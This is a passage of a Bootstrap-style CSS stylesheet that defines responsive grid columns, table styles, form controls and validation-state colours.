      .col-md-4,
      .col-md-5,
      .col-md-6,
      .col-md-7,
      .col-md-8,
      .col-md-9,
      .col-sm-1,
      .col-sm-10,
      .col-sm-11,
      .col-sm-12,
      .col-sm-2,
      .col-sm-3,
      .col-sm-4,
      .col-sm-5,
      .col-sm-6,
      .col-sm-7,
      .col-sm-8,
      .col-sm-9,
      .col-xs-1,
      .col-xs-10,
      .col-xs-11,
      .col-xs-12,
      .col-xs-2,
      .col-xs-3,
      .col-xs-4,
      .col-xs-5,
      .col-xs-6,
      .col-xs-7,
      .col-xs-8,
      .col-xs-9 {
        position: relative;
        min-height: 1px;
        padding-right: 15px;
        padding-left: 15px;
      }
      .col-xs-1,
      .col-xs-10,
      .col-xs-11,
      .col-xs-12,
      .col-xs-2,
      .col-xs-3,
      .col-xs-4,
      .col-xs-5,
      .col-xs-6,
      .col-xs-7,
      .col-xs-8,
      .col-xs-9 {
        float: left;
      }
      .col-xs-12 {
        width: 100%;
      }
      .col-xs-11 {
        width: 91.66666667%;
      }
      .col-xs-10 {
        width: 83.33333333%;
      }
      .col-xs-9 {
        width: 75%;
      }
      .col-xs-8 {
        width: 66.66666667%;
      }
      .col-xs-7 {
        width: 58.33333333%;
      }
      .col-xs-6 {
        width: 50%;
      }
      .col-xs-5 {
        width: 41.66666667%;
      }
      .col-xs-4 {
        width: 33.33333333%;
      }
      .col-xs-3 {
        width: 25%;
      }
      .col-xs-2 {
        width: 16.66666667%;
      }
      .col-xs-1 {
        width: 8.33333333%;
      }
      .col-xs-pull-12 {
        right: 100%;
      }
      .col-xs-pull-11 {
        right: 91.66666667%;
      }
      .col-xs-pull-10 {
        right: 83.33333333%;
      }
      .col-xs-pull-9 {
        right: 75%;
      }
      .col-xs-pull-8 {
        right: 66.66666667%;
      }
      .col-xs-pull-7 {
        right: 58.33333333%;
      }
      .col-xs-pull-6 {
        right: 50%;
      }
      .col-xs-pull-5 {
        right: 41.66666667%;
      }
      .col-xs-pull-4 {
        right: 33.33333333%;
      }
      .col-xs-pull-3 {
        right: 25%;
      }
      .col-xs-pull-2 {
        right: 16.66666667%;
      }
      .col-xs-pull-1 {
        right: 8.33333333%;
      }
      .col-xs-pull-0 {
        right: auto;
      }
      .col-xs-push-12 {
        left: 100%;
      }
      .col-xs-push-11 {
        left: 91.66666667%;
      }
      .col-xs-push-10 {
        left: 83.33333333%;
      }
      .col-xs-push-9 {
        left: 75%;
      }
      .col-xs-push-8 {
        left: 66.66666667%;
      }
      .col-xs-push-7 {
        left: 58.33333333%;
      }
      .col-xs-push-6 {
        left: 50%;
      }
      .col-xs-push-5 {
        left: 41.66666667%;
      }
      .col-xs-push-4 {
        left: 33.33333333%;
      }
      .col-xs-push-3 {
        left: 25%;
      }
      .col-xs-push-2 {
        left: 16.66666667%;
      }
      .col-xs-push-1 {
        left: 8.33333333%;
      }
      .col-xs-push-0 {
        left: auto;
      }
      .col-xs-offset-12 {
        margin-left: 100%;
      }
      .col-xs-offset-11 {
        margin-left: 91.66666667%;
      }
      .col-xs-offset-10 {
        margin-left: 83.33333333%;
      }
      .col-xs-offset-9 {
        margin-left: 75%;
      }
      .col-xs-offset-8 {
        margin-left: 66.66666667%;
      }
      .col-xs-offset-7 {
        margin-left: 58.33333333%;
      }
      .col-xs-offset-6 {
        margin-left: 50%;
      }
      .col-xs-offset-5 {
        margin-left: 41.66666667%;
      }
      .col-xs-offset-4 {
        margin-left: 33.33333333%;
      }
      .col-xs-offset-3 {
        margin-left: 25%;
      }
      .col-xs-offset-2 {
        margin-left: 16.66666667%;
      }
      .col-xs-offset-1 {
        margin-left: 8.33333333%;
      }
      .col-xs-offset-0 {
        margin-left: 0;
      }
      @media (min-width: 768px) {
        .col-sm-1,
        .col-sm-10,
        .col-sm-11,
        .col-sm-12,
        .col-sm-2,
        .col-sm-3,
        .col-sm-4,
        .col-sm-5,
        .col-sm-6,
        .col-sm-7,
        .col-sm-8,
        .col-sm-9 {
          float: left;
        }
        .col-sm-12 {
          width: 100%;
        }
        .col-sm-11 {
          width: 91.66666667%;
        }
        .col-sm-10 {
          width: 83.33333333%;
        }
        .col-sm-9 {
          width: 75%;
        }
        .col-sm-8 {
          width: 66.66666667%;
        }
        .col-sm-7 {
          width: 58.33333333%;
        }
        .col-sm-6 {
          width: 50%;
        }
        .col-sm-5 {
          width: 41.66666667%;
        }
        .col-sm-4 {
          width: 33.33333333%;
        }
        .col-sm-3 {
          width: 25%;
        }
        .col-sm-2 {
          width: 16.66666667%;
        }
        .col-sm-1 {
          width: 8.33333333%;
        }
        .col-sm-pull-12 {
          right: 100%;
        }
        .col-sm-pull-11 {
          right: 91.66666667%;
        }
        .col-sm-pull-10 {
          right: 83.33333333%;
        }
        .col-sm-pull-9 {
          right: 75%;
        }
        .col-sm-pull-8 {
          right: 66.66666667%;
        }
        .col-sm-pull-7 {
          right: 58.33333333%;
        }
        .col-sm-pull-6 {
          right: 50%;
        }
        .col-sm-pull-5 {
          right: 41.66666667%;
        }
        .col-sm-pull-4 {
          right: 33.33333333%;
        }
        .col-sm-pull-3 {
          right: 25%;
        }
        .col-sm-pull-2 {
          right: 16.66666667%;
        }
        .col-sm-pull-1 {
          right: 8.33333333%;
        }
        .col-sm-pull-0 {
          right: auto;
        }
        .col-sm-push-12 {
          left: 100%;
        }
        .col-sm-push-11 {
          left: 91.66666667%;
        }
        .col-sm-push-10 {
          left: 83.33333333%;
        }
        .col-sm-push-9 {
          left: 75%;
        }
        .col-sm-push-8 {
          left: 66.66666667%;
        }
        .col-sm-push-7 {
          left: 58.33333333%;
        }
        .col-sm-push-6 {
          left: 50%;
        }
        .col-sm-push-5 {
          left: 41.66666667%;
        }
        .col-sm-push-4 {
          left: 33.33333333%;
        }
        .col-sm-push-3 {
          left: 25%;
        }
        .col-sm-push-2 {
          left: 16.66666667%;
        }
        .col-sm-push-1 {
          left: 8.33333333%;
        }
        .col-sm-push-0 {
          left: auto;
        }
        .col-sm-offset-12 {
          margin-left: 100%;
        }
        .col-sm-offset-11 {
          margin-left: 91.66666667%;
        }
        .col-sm-offset-10 {
          margin-left: 83.33333333%;
        }
        .col-sm-offset-9 {
          margin-left: 75%;
        }
        .col-sm-offset-8 {
          margin-left: 66.66666667%;
        }
        .col-sm-offset-7 {
          margin-left: 58.33333333%;
        }
        .col-sm-offset-6 {
          margin-left: 50%;
        }
        .col-sm-offset-5 {
          margin-left: 41.66666667%;
        }
        .col-sm-offset-4 {
          margin-left: 33.33333333%;
        }
        .col-sm-offset-3 {
          margin-left: 25%;
        }
        .col-sm-offset-2 {
          margin-left: 16.66666667%;
        }
        .col-sm-offset-1 {
          margin-left: 8.33333333%;
        }
        .col-sm-offset-0 {
          margin-left: 0;
        }
      }
      @media (min-width: 992px) {
        .col-md-1,
        .col-md-10,
        .col-md-11,
        .col-md-12,
        .col-md-2,
        .col-md-3,
        .col-md-4,
        .col-md-5,
        .col-md-6,
        .col-md-7,
        .col-md-8,
        .col-md-9 {
          float: left;
        }
        .col-md-12 {
          width: 100%;
        }
        .col-md-11 {
          width: 91.66666667%;
        }
        .col-md-10 {
          width: 83.33333333%;
        }
        .col-md-9 {
          width: 75%;
        }
        .col-md-8 {
          width: 66.66666667%;
        }
        .col-md-7 {
          width: 58.33333333%;
        }
        .col-md-6 {
          width: 50%;
        }
        .col-md-5 {
          width: 41.66666667%;
        }
        .col-md-4 {
          width: 33.33333333%;
        }
        .col-md-3 {
          width: 25%;
        }
        .col-md-2 {
          width: 16.66666667%;
        }
        .col-md-1 {
          width: 8.33333333%;
        }
        .col-md-pull-12 {
          right: 100%;
        }
        .col-md-pull-11 {
          right: 91.66666667%;
        }
        .col-md-pull-10 {
          right: 83.33333333%;
        }
        .col-md-pull-9 {
          right: 75%;
        }
        .col-md-pull-8 {
          right: 66.66666667%;
        }
        .col-md-pull-7 {
          right: 58.33333333%;
        }
        .col-md-pull-6 {
          right: 50%;
        }
        .col-md-pull-5 {
          right: 41.66666667%;
        }
        .col-md-pull-4 {
          right: 33.33333333%;
        }
        .col-md-pull-3 {
          right: 25%;
        }
        .col-md-pull-2 {
          right: 16.66666667%;
        }
        .col-md-pull-1 {
          right: 8.33333333%;
        }
        .col-md-pull-0 {
          right: auto;
        }
        .col-md-push-12 {
          left: 100%;
        }
        .col-md-push-11 {
          left: 91.66666667%;
        }
        .col-md-push-10 {
          left: 83.33333333%;
        }
        .col-md-push-9 {
          left: 75%;
        }
        .col-md-push-8 {
          left: 66.66666667%;
        }
        .col-md-push-7 {
          left: 58.33333333%;
        }
        .col-md-push-6 {
          left: 50%;
        }
        .col-md-push-5 {
          left: 41.66666667%;
        }
        .col-md-push-4 {
          left: 33.33333333%;
        }
        .col-md-push-3 {
          left: 25%;
        }
        .col-md-push-2 {
          left: 16.66666667%;
        }
        .col-md-push-1 {
          left: 8.33333333%;
        }
        .col-md-push-0 {
          left: auto;
        }
        .col-md-offset-12 {
          margin-left: 100%;
        }
        .col-md-offset-11 {
          margin-left: 91.66666667%;
        }
        .col-md-offset-10 {
          margin-left: 83.33333333%;
        }
        .col-md-offset-9 {
          margin-left: 75%;
        }
        .col-md-offset-8 {
          margin-left: 66.66666667%;
        }
        .col-md-offset-7 {
          margin-left: 58.33333333%;
        }
        .col-md-offset-6 {
          margin-left: 50%;
        }
        .col-md-offset-5 {
          margin-left: 41.66666667%;
        }
        .col-md-offset-4 {
          margin-left: 33.33333333%;
        }
        .col-md-offset-3 {
          margin-left: 25%;
        }
        .col-md-offset-2 {
          margin-left: 16.66666667%;
        }
        .col-md-offset-1 {
          margin-left: 8.33333333%;
        }
        .col-md-offset-0 {
          margin-left: 0;
        }
      }
      @media (min-width: 1200px) {
        .col-lg-1,
        .col-lg-10,
        .col-lg-11,
        .col-lg-12,
        .col-lg-2,
        .col-lg-3,
        .col-lg-4,
        .col-lg-5,
        .col-lg-6,
        .col-lg-7,
        .col-lg-8,
        .col-lg-9 {
          float: left;
        }
        .col-lg-12 {
          width: 100%;
        }
        .col-lg-11 {
          width: 91.66666667%;
        }
        .col-lg-10 {
          width: 83.33333333%;
        }
        .col-lg-9 {
          width: 75%;
        }
        .col-lg-8 {
          width: 66.66666667%;
        }
        .col-lg-7 {
          width: 58.33333333%;
        }
        .col-lg-6 {
          width: 50%;
        }
        .col-lg-5 {
          width: 41.66666667%;
        }
        .col-lg-4 {
          width: 33.33333333%;
        }
        .col-lg-3 {
          width: 25%;
        }
        .col-lg-2 {
          width: 16.66666667%;
        }
        .col-lg-1 {
          width: 8.33333333%;
        }
        .col-lg-pull-12 {
          right: 100%;
        }
        .col-lg-pull-11 {
          right: 91.66666667%;
        }
        .col-lg-pull-10 {
          right: 83.33333333%;
        }
        .col-lg-pull-9 {
          right: 75%;
        }
        .col-lg-pull-8 {
          right: 66.66666667%;
        }
        .col-lg-pull-7 {
          right: 58.33333333%;
        }
        .col-lg-pull-6 {
          right: 50%;
        }
        .col-lg-pull-5 {
          right: 41.66666667%;
        }
        .col-lg-pull-4 {
          right: 33.33333333%;
        }
        .col-lg-pull-3 {
          right: 25%;
        }
        .col-lg-pull-2 {
          right: 16.66666667%;
        }
        .col-lg-pull-1 {
          right: 8.33333333%;
        }
        .col-lg-pull-0 {
          right: auto;
        }
        .col-lg-push-12 {
          left: 100%;
        }
        .col-lg-push-11 {
          left: 91.66666667%;
        }
        .col-lg-push-10 {
          left: 83.33333333%;
        }
        .col-lg-push-9 {
          left: 75%;
        }
        .col-lg-push-8 {
          left: 66.66666667%;
        }
        .col-lg-push-7 {
          left: 58.33333333%;
        }
        .col-lg-push-6 {
          left: 50%;
        }
        .col-lg-push-5 {
          left: 41.66666667%;
        }
        .col-lg-push-4 {
          left: 33.33333333%;
        }
        .col-lg-push-3 {
          left: 25%;
        }
        .col-lg-push-2 {
          left: 16.66666667%;
        }
        .col-lg-push-1 {
          left: 8.33333333%;
        }
        .col-lg-push-0 {
          left: auto;
        }
        .col-lg-offset-12 {
          margin-left: 100%;
        }
        .col-lg-offset-11 {
          margin-left: 91.66666667%;
        }
        .col-lg-offset-10 {
          margin-left: 83.33333333%;
        }
        .col-lg-offset-9 {
          margin-left: 75%;
        }
        .col-lg-offset-8 {
          margin-left: 66.66666667%;
        }
        .col-lg-offset-7 {
          margin-left: 58.33333333%;
        }
        .col-lg-offset-6 {
          margin-left: 50%;
        }
        .col-lg-offset-5 {
          margin-left: 41.66666667%;
        }
        .col-lg-offset-4 {
          margin-left: 33.33333333%;
        }
        .col-lg-offset-3 {
          margin-left: 25%;
        }
        .col-lg-offset-2 {
          margin-left: 16.66666667%;
        }
        .col-lg-offset-1 {
          margin-left: 8.33333333%;
        }
        .col-lg-offset-0 {
          margin-left: 0;
        }
      }
      table {
        background-color: transparent;
      }
      caption {
        padding-top: 8px;
        padding-bottom: 8px;
        color: #777;
        text-align: left;
      }
      th {
        text-align: left;
      }
      .table {
        width: 100%;
        max-width: 100%;
        margin-bottom: 20px;
      }
      .table > tbody > tr > td,
      .table > tbody > tr > th,
      .table > tfoot > tr > td,
      .table > tfoot > tr > th,
      .table > thead > tr > td,
      .table > thead > tr > th {
        padding: 8px;
        line-height: 1.42857143;
        vertical-align: top;
        border-top: 1px solid #ddd;
      }
      .table > thead > tr > th {
        vertical-align: bottom;
        border-bottom: 2px solid #ddd;
      }
      .table > caption + thead > tr:first-child > td,
      .table > caption + thead > tr:first-child > th,
      .table > colgroup + thead > tr:first-child > td,
      .table > colgroup + thead > tr:first-child > th,
      .table > thead:first-child > tr:first-child > td,
      .table > thead:first-child > tr:first-child > th {
        border-top: 0;
      }
      .table > tbody + tbody {
        border-top: 2px solid #ddd;
      }
      .table .table {
        background-color: #fff;
      }
      .table-condensed > tbody > tr > td,
      .table-condensed > tbody > tr > th,
      .table-condensed > tfoot > tr > td,
      .table-condensed > tfoot > tr > th,
      .table-condensed > thead > tr > td,
      .table-condensed > thead > tr > th {
        padding: 5px;
      }
      .table-bordered {
        border: 1px solid #ddd;
      }
      .table-bordered > tbody > tr > td,
      .table-bordered > tbody > tr > th,
      .table-bordered > tfoot > tr > td,
      .table-bordered > tfoot > tr > th,
      .table-bordered > thead > tr > td,
      .table-bordered > thead > tr > th {
        border: 1px solid #ddd;
      }
      .table-bordered > thead > tr > td,
      .table-bordered > thead > tr > th {
        border-bottom-width: 2px;
      }
      .table-striped > tbody > tr:nth-of-type(odd) {
        background-color: #f9f9f9;
      }
      .table-hover > tbody > tr:hover {
        background-color: #f5f5f5;
      }
      table col[class*="col-"] {
        position: static;
        display: table-column;
        float: none;
      }
      table td[class*="col-"],
      table th[class*="col-"] {
        position: static;
        display: table-cell;
        float: none;
      }
      .table > tbody > tr.active > td,
      .table > tbody > tr.active > th,
      .table > tbody > tr > td.active,
      .table > tbody > tr > th.active,
      .table > tfoot > tr.active > td,
      .table > tfoot > tr.active > th,
      .table > tfoot > tr > td.active,
      .table > tfoot > tr > th.active,
      .table > thead > tr.active > td,
      .table > thead > tr.active > th,
      .table > thead > tr > td.active,
      .table > thead > tr > th.active {
        background-color: #f5f5f5;
      }
      .table-hover > tbody > tr.active:hover > td,
      .table-hover > tbody > tr.active:hover > th,
      .table-hover > tbody > tr:hover > .active,
      .table-hover > tbody > tr > td.active:hover,
      .table-hover > tbody > tr > th.active:hover {
        background-color: #e8e8e8;
      }
      .table > tbody > tr.success > td,
      .table > tbody > tr.success > th,
      .table > tbody > tr > td.success,
      .table > tbody > tr > th.success,
      .table > tfoot > tr.success > td,
      .table > tfoot > tr.success > th,
      .table > tfoot > tr > td.success,
      .table > tfoot > tr > th.success,
      .table > thead > tr.success > td,
      .table > thead > tr.success > th,
      .table > thead > tr > td.success,
      .table > thead > tr > th.success {
        background-color: #dff0d8;
      }
      .table-hover > tbody > tr.success:hover > td,
      .table-hover > tbody > tr.success:hover > th,
      .table-hover > tbody > tr:hover > .success,
      .table-hover > tbody > tr > td.success:hover,
      .table-hover > tbody > tr > th.success:hover {
        background-color: #d0e9c6;
      }
      .table > tbody > tr.info > td,
      .table > tbody > tr.info > th,
      .table > tbody > tr > td.info,
      .table > tbody > tr > th.info,
      .table > tfoot > tr.info > td,
      .table > tfoot > tr.info > th,
      .table > tfoot > tr > td.info,
      .table > tfoot > tr > th.info,
      .table > thead > tr.info > td,
      .table > thead > tr.info > th,
      .table > thead > tr > td.info,
      .table > thead > tr > th.info {
        background-color: #d9edf7;
      }
      .table-hover > tbody > tr.info:hover > td,
      .table-hover > tbody > tr.info:hover > th,
      .table-hover > tbody > tr:hover > .info,
      .table-hover > tbody > tr > td.info:hover,
      .table-hover > tbody > tr > th.info:hover {
        background-color: #c4e3f3;
      }
      .table > tbody > tr.warning > td,
      .table > tbody > tr.warning > th,
      .table > tbody > tr > td.warning,
      .table > tbody > tr > th.warning,
      .table > tfoot > tr.warning > td,
      .table > tfoot > tr.warning > th,
      .table > tfoot > tr > td.warning,
      .table > tfoot > tr > th.warning,
      .table > thead > tr.warning > td,
      .table > thead > tr.warning > th,
      .table > thead > tr > td.warning,
      .table > thead > tr > th.warning {
        background-color: #fcf8e3;
      }
      .table-hover > tbody > tr.warning:hover > td,
      .table-hover > tbody > tr.warning:hover > th,
      .table-hover > tbody > tr:hover > .warning,
      .table-hover > tbody > tr > td.warning:hover,
      .table-hover > tbody > tr > th.warning:hover {
        background-color: #faf2cc;
      }
      .table > tbody > tr.danger > td,
      .table > tbody > tr.danger > th,
      .table > tbody > tr > td.danger,
      .table > tbody > tr > th.danger,
      .table > tfoot > tr.danger > td,
      .table > tfoot > tr.danger > th,
      .table > tfoot > tr > td.danger,
      .table > tfoot > tr > th.danger,
      .table > thead > tr.danger > td,
      .table > thead > tr.danger > th,
      .table > thead > tr > td.danger,
      .table > thead > tr > th.danger {
        background-color: #f2dede;
      }
      .table-hover > tbody > tr.danger:hover > td,
      .table-hover > tbody > tr.danger:hover > th,
      .table-hover > tbody > tr:hover > .danger,
      .table-hover > tbody > tr > td.danger:hover,
      .table-hover > tbody > tr > th.danger:hover {
        background-color: #ebcccc;
      }
      .table-responsive {
        min-height: 0.01%;
        overflow-x: auto;
      }
      @media screen and (max-width: 767px) {
        .table-responsive {
          width: 100%;
          margin-bottom: 15px;
          overflow-y: hidden;
          -ms-overflow-style: -ms-autohiding-scrollbar;
          border: 1px solid #ddd;
        }
        .table-responsive > .table {
          margin-bottom: 0;
        }
        .table-responsive > .table > tbody > tr > td,
        .table-responsive > .table > tbody > tr > th,
        .table-responsive > .table > tfoot > tr > td,
        .table-responsive > .table > tfoot > tr > th,
        .table-responsive > .table > thead > tr > td,
        .table-responsive > .table > thead > tr > th {
          white-space: nowrap;
        }
        .table-responsive > .table-bordered {
          border: 0;
        }
        .table-responsive > .table-bordered > tbody > tr > td:first-child,
        .table-responsive > .table-bordered > tbody > tr > th:first-child,
        .table-responsive > .table-bordered > tfoot > tr > td:first-child,
        .table-responsive > .table-bordered > tfoot > tr > th:first-child,
        .table-responsive > .table-bordered > thead > tr > td:first-child,
        .table-responsive > .table-bordered > thead > tr > th:first-child {
          border-left: 0;
        }
        .table-responsive > .table-bordered > tbody > tr > td:last-child,
        .table-responsive > .table-bordered > tbody > tr > th:last-child,
        .table-responsive > .table-bordered > tfoot > tr > td:last-child,
        .table-responsive > .table-bordered > tfoot > tr > th:last-child,
        .table-responsive > .table-bordered > thead > tr > td:last-child,
        .table-responsive > .table-bordered > thead > tr > th:last-child {
          border-right: 0;
        }
        .table-responsive > .table-bordered > tbody > tr:last-child > td,
        .table-responsive > .table-bordered > tbody > tr:last-child > th,
        .table-responsive > .table-bordered > tfoot > tr:last-child > td,
        .table-responsive > .table-bordered > tfoot > tr:last-child > th {
          border-bottom: 0;
        }
      }
      fieldset {
        min-width: 0;
        padding: 0;
        margin: 0;
        border: 0;
      }
      legend {
        display: block;
        width: 100%;
        padding: 0;
        margin-bottom: 20px;
        font-size: 21px;
        line-height: inherit;
        color: #333;
        border: 0;
        border-bottom: 1px solid #e5e5e5;
      }
      label {
        display: inline-block;
        max-width: 100%;
        margin-bottom: 5px;
        font-weight: 700;
      }
      input[type="search"] {
        -webkit-box-sizing: border-box;
        -moz-box-sizing: border-box;
        box-sizing: border-box;
      }
      input[type="checkbox"],
      input[type="radio"] {
        margin: 4px 0 0;
        margin-top: 1px\9;
        line-height: normal;
      }
      input[type="file"] {
        display: block;
      }
      input[type="range"] {
        display: block;
        width: 100%;
      }
      select[multiple],
      select[size] {
        height: auto;
      }
      input[type="file"]:focus,
      input[type="checkbox"]:focus,
      input[type="radio"]:focus {
        outline: 5px auto -webkit-focus-ring-color;
        outline-offset: -2px;
      }
      output {
        display: block;
        padding-top: 7px;
        font-size: 14px;
        line-height: 1.42857143;
        color: #555;
      }
      .form-control {
        display: block;
        width: 100%;
        height: 34px;
        padding: 6px 12px;
        font-size: 14px;
        line-height: 1.42857143;
        color: #555;
        background-color: #fff;
        background-image: none;
        border: 1px solid #ccc;
        border-radius: 4px;
        -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
        -webkit-transition: border-color ease-in-out 0.15s, -webkit-box-shadow ease-in-out 0.15s;
        -o-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
        transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
      }
      .form-control:focus {
        border-color: #66afe9;
        outline: 0;
        -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(102, 175, 233, 0.6);
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(102, 175, 233, 0.6);
      }
      .form-control::-moz-placeholder {
        color: #999;
        opacity: 1;
      }
      .form-control:-ms-input-placeholder {
        color: #999;
      }
      .form-control::-webkit-input-placeholder {
        color: #999;
      }
      .form-control::-ms-expand {
        background-color: transparent;
        border: 0;
      }
      .form-control[disabled],
      .form-control[readonly],
      fieldset[disabled] .form-control {
        background-color: #eee;
        opacity: 1;
      }
      .form-control[disabled],
      fieldset[disabled] .form-control {
        cursor: not-allowed;
      }
      textarea.form-control {
        height: auto;
      }
      input[type="search"] {
        -webkit-appearance: none;
      }
      @media screen and (-webkit-min-device-pixel-ratio: 0) {
        input[type="date"].form-control,
        input[type="time"].form-control,
        input[type="datetime-local"].form-control,
        input[type="month"].form-control {
          line-height: 34px;
        }
        .input-group-sm input[type="date"],
        .input-group-sm input[type="time"],
        .input-group-sm input[type="datetime-local"],
        .input-group-sm input[type="month"],
        input[type="date"].input-sm,
        input[type="time"].input-sm,
        input[type="datetime-local"].input-sm,
        input[type="month"].input-sm {
          line-height: 30px;
        }
        .input-group-lg input[type="date"],
        .input-group-lg input[type="time"],
        .input-group-lg input[type="datetime-local"],
        .input-group-lg input[type="month"],
        input[type="date"].input-lg,
        input[type="time"].input-lg,
        input[type="datetime-local"].input-lg,
        input[type="month"].input-lg {
          line-height: 46px;
        }
      }
      .form-group {
        margin-bottom: 15px;
      }
      .checkbox,
      .radio {
        position: relative;
        display: block;
        margin-top: 10px;
        margin-bottom: 10px;
      }
      .checkbox label,
      .radio label {
        min-height: 20px;
        padding-left: 20px;
        margin-bottom: 0;
        font-weight: 400;
        cursor: pointer;
      }
      .checkbox input[type="checkbox"],
      .checkbox-inline input[type="checkbox"],
      .radio input[type="radio"],
      .radio-inline input[type="radio"] {
        position: absolute;
        margin-top: 4px\9;
        margin-left: -20px;
      }
      .checkbox + .checkbox,
      .radio + .radio {
        margin-top: -5px;
      }
      .checkbox-inline,
      .radio-inline {
        position: relative;
        display: inline-block;
        padding-left: 20px;
        margin-bottom: 0;
        font-weight: 400;
        vertical-align: middle;
        cursor: pointer;
      }
      .checkbox-inline + .checkbox-inline,
      .radio-inline + .radio-inline {
        margin-top: 0;
        margin-left: 10px;
      }
      fieldset[disabled] input[type="checkbox"],
      fieldset[disabled] input[type="radio"],
      input[type="checkbox"].disabled,
      input[type="checkbox"][disabled],
      input[type="radio"].disabled,
      input[type="radio"][disabled] {
        cursor: not-allowed;
      }
      .checkbox-inline.disabled,
      .radio-inline.disabled,
      fieldset[disabled] .checkbox-inline,
      fieldset[disabled] .radio-inline {
        cursor: not-allowed;
      }
      .checkbox.disabled label,
      .radio.disabled label,
      fieldset[disabled] .checkbox label,
      fieldset[disabled] .radio label {
        cursor: not-allowed;
      }
      .form-control-static {
        min-height: 34px;
        padding-top: 7px;
        padding-bottom: 7px;
        margin-bottom: 0;
      }
      .form-control-static.input-lg,
      .form-control-static.input-sm {
        padding-right: 0;
        padding-left: 0;
      }
      .input-sm {
        height: 30px;
        padding: 5px 10px;
        font-size: 12px;
        line-height: 1.5;
        border-radius: 3px;
      }
      select.input-sm {
        height: 30px;
        line-height: 30px;
      }
      select[multiple].input-sm,
      textarea.input-sm {
        height: auto;
      }
      .form-group-sm .form-control {
        height: 30px;
        padding: 5px 10px;
        font-size: 12px;
        line-height: 1.5;
        border-radius: 3px;
      }
      .form-group-sm select.form-control {
        height: 30px;
        line-height: 30px;
      }
      .form-group-sm select[multiple].form-control,
      .form-group-sm textarea.form-control {
        height: auto;
      }
      .form-group-sm .form-control-static {
        height: 30px;
        min-height: 32px;
        padding: 6px 10px;
        font-size: 12px;
        line-height: 1.5;
      }
      .input-lg {
        height: 46px;
        padding: 10px 16px;
        font-size: 18px;
        line-height: 1.3333333;
        border-radius: 6px;
      }
      select.input-lg {
        height: 46px;
        line-height: 46px;
      }
      select[multiple].input-lg,
      textarea.input-lg {
        height: auto;
      }
      .form-group-lg .form-control {
        height: 46px;
        padding: 10px 16px;
        font-size: 18px;
        line-height: 1.3333333;
        border-radius: 6px;
      }
      .form-group-lg select.form-control {
        height: 46px;
        line-height: 46px;
      }
      .form-group-lg select[multiple].form-control,
      .form-group-lg textarea.form-control {
        height: auto;
      }
      .form-group-lg .form-control-static {
        height: 46px;
        min-height: 38px;
        padding: 11px 16px;
        font-size: 18px;
        line-height: 1.3333333;
      }
      .has-feedback {
        position: relative;
      }
      .has-feedback .form-control {
        padding-right: 42.5px;
      }
      .form-control-feedback {
        position: absolute;
        top: 0;
        right: 0;
        z-index: 2;
        display: block;
        width: 34px;
        height: 34px;
        line-height: 34px;
        text-align: center;
        pointer-events: none;
      }
      .form-group-lg .form-control + .form-control-feedback,
      .input-group-lg + .form-control-feedback,
      .input-lg + .form-control-feedback {
        width: 46px;
        height: 46px;
        line-height: 46px;
      }
      .form-group-sm .form-control + .form-control-feedback,
      .input-group-sm + .form-control-feedback,
      .input-sm + .form-control-feedback {
        width: 30px;
        height: 30px;
        line-height: 30px;
      }
      .has-success .checkbox,
      .has-success .checkbox-inline,
      .has-success .control-label,
      .has-success .help-block,
      .has-success .radio,
      .has-success .radio-inline,
      .has-success.checkbox label,
      .has-success.checkbox-inline label,
      .has-success.radio label,
      .has-success.radio-inline label {
        color: #3c763d;
      }
      .has-success .form-control {
        border-color: #3c763d;
        -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
      }
      .has-success .form-control:focus {
        border-color: #2b542c;
        -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #67b168;
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #67b168;
      }
      .has-success .input-group-addon {
        color: #3c763d;
        background-color: #dff0d8;
        border-color: #3c763d;
      }
      .has-success .form-control-feedback {
        color: #3c763d;
      }
      .has-warning .checkbox,
      .has-warning .checkbox-inline,
      .has-warning .control-label,
      .has-warning .help-block,
      .has-warning .radio,
      .has-warning .radio-inline,
      .has-warning.checkbox label,
      .has-warning.checkbox-inline label,
      .has-warning.radio label,
      .has-warning.radio-inline label {
        color: #8a6d3b;
      }
      .has-warning .form-control {
        border-color: #8a6d3b;
        -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
      }
      .has-warning .form-control:focus {
        border-color: #66512c;
        -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #c0a16b;
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #c0a16b;
      }
      .has-warning .input-group-addon {
        color: #8a6d3b;
        background-color: #fcf8e3;
        border-color: #8a6d3b;
      }
      .has-warning .form-control-feedback {
        color: #8a6d3b;
      }
      .has-error .checkbox,
      .has-error .checkbox-inline,
      .has-error .control-label,
      .has-error .help-block,
      .has-error .radio,
      .has-error .radio-inline,
      .has-error.checkbox label,
      .has-error.checkbox-inline label,
      .has-error.radio label,
      .has-error.radio-inline label {
        color: #a94442;
      }
      .has-error .form-control {
        border-color: #a94442;
        -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
      }
      .has-error .form-control:focus {
        border-color: #843534;
        -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #ce8483;
        box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #ce8483;
      }
      .has-error .input-group-addon {
        color: #a94442;
        background-color: #f2dede;
        border-color: #a94442;
      }
      .has-error .form-control-feedback {
        color: #a94442;
      }
      .has-feedback label ~ .form-control-feedback {
        top: 25px;
      }
      .has-feedback label.sr-only ~ .form-control-feedback {
        top: 0;
      }
      .help-block {
        display: block;
        margin-top: 5px;
        margin-bottom: 10px;
        color: #737373;
      }
      @media (min-width: 768px) {
        .form-inline .form-group {
          display: inline-block;
          margin-bottom: 0;
          vertical-align: middle;
        }
        .form-inline .form-control {
          display: inline-block;
          width: auto;
          vertical-align: middle;
        }
